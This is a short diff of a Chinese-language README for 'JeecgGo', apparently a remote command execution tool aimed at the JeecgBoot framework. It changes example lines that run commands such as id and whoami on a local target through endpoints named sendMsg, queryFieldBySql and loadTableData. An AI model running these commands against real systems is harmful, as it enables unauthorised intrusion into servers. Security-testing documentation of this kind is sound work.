@@ -55,9 +55,9 @@ JeecgGo.exe -u http://127.0.0.1/jeecg-boot/ -x token
 ```
 命令执行
 ```
+JeecgGo.exe -u http://127.0.0.1/jeecg-boot/ -n sendMsg -c id -x token
 JeecgGo.exe -u http://127.0.0.1/jeecg-boot/ -n queryFieldBySql -c whoami
-JeecgGo.exe -u http://127.0.0.1/jeecg-boot/ -n queryFieldBySql -c "echo 111"
-JeecgGo.exe -u http://127.0.0.1/jeecg-boot/ -n queryFieldBySql -c id -x token
+JeecgGo.exe -u http://127.0.0.1/jeecg-boot/ -n loadTableData -c "echo 111"
 ```
 # 更新
 - 2025/10/18: 对代码结构进行重构, 便于后续新增POC及内容调整
